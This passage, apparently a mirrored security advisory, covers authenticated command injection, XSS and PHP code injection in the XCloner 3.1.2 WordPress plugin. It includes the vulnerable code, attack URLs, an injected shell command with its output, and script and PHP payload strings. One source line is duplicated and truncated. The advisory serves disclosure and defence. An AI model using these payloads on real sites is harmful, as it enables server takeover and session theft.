@@ -1,0 +1,63 @@
+id: 23696
+date: 06/03/2015
+title: WordPress Xloner 3.1.2 XSS / Command Execution Vulnerabilities
+author: Larry Cashdollar
+cves: 
+
+Title: Xloner v3.1.2 wordpress plugin authenticated command execution and XSS
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-05-10
+Download Site: https://wordpress.org/plugins/xclonerbackupandrestore/ http://extensions.joomla.org/extensions/accessasecurity/ sitesecurity/ backup/665
+Vendor: Ovidiu Liuta, @thinkovi
+Vendor Notified: 0000-00-00
+Vendor Contact: @thinkovi
+Description: XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!
+Vulnerability:
+Lines 1129 of 1135 in cloner.functions.php
+
+1129 $excluded_cmd = "";
+1130 if ($fp = @fopen($_REQUEST['
+1130 if ($fp = @fopen($_REQUEST['excl_manual'], "r")) {
+1131 while (!feof($fp))
+1132 $excluded_cmd .= fread($fp, 1024);
+1133
+1134 fclose($fp);
+1135 }
+
+Line 1205:
+If configured for manual mode the contents of $excluded_cmd are passed to exec();
+1205 exec($_CONFIG[tarpath] . " $excluded_cmd ". $_CONFIG['tarcompress'] ."vf $backup_file update $file");
+We need to supply a file with a list of commands to execute in it, we can create this via the backup comments feature. It creates a file under administrator/backups/.comments with whatever you want in it. Like ;id>/tmp/w00t;
+
+Then change the configuration to manual backup by selecting the radio button and perform a backup.
+Hit this link:
+http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_cloner&task=refresh&json=0&startf=300&lines=6204&backup=backup_20150511_
+2028_sqlnodrop.tar&excl_manual=/usr/share/wordpress/administrator/backups/.comments
+
+In a shell:
+$ cat /tmp/w00t
+uid=33(wwwdata)
+gid=33(wwwdata)
+groups=33(wwwdata)
+
+Also $excluded_cmd is XSS
+
+http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_cloner&task=refresh&json=0&startf=800&lines=6204&backup=backup_20150511_
+2028_sqlnodrop.tar&excl_manual=’><script>alert(‘w00t’);</script>
+
+Chrome XSS alert:
+
+The XSS Auditor refused to execute a script in
+'http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_…lnodrop.tar&excl_manual=%27%3E%3Cscript%3Ealert(%27w00t%27);%3C/script%3E' because
+its source code was found within the request. The auditor was enabled as the server sent
+neither an 'XXSSProtection' nor 'ContentSecurityPolicy' header.
+plugins.php:403 The XSS Auditor refused to execute a script in
+'http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&option=com_…lno
+drop.tar&excl_manual=%27%3E%3Cscript%3Ealert(%27w00t%27);%3C/script%3E' because
+its source code was found within the request. The auditor was enabled as the server sent
+neither an 'XXSSProtection' nor 'ContentSecurityPolicy' header.
+
+The default template has an error with the LM_LOGIN_TEXT field so just clean that out or you’ll get a syntax error when trying to execute.
+Adding foo”);phpinfo();define(“foo to the Translation LM_FRONT_* fields then browsing to language/italian.php you’ll execute phpinfo();.
+
+#  0day.today [2023-03-23]  #
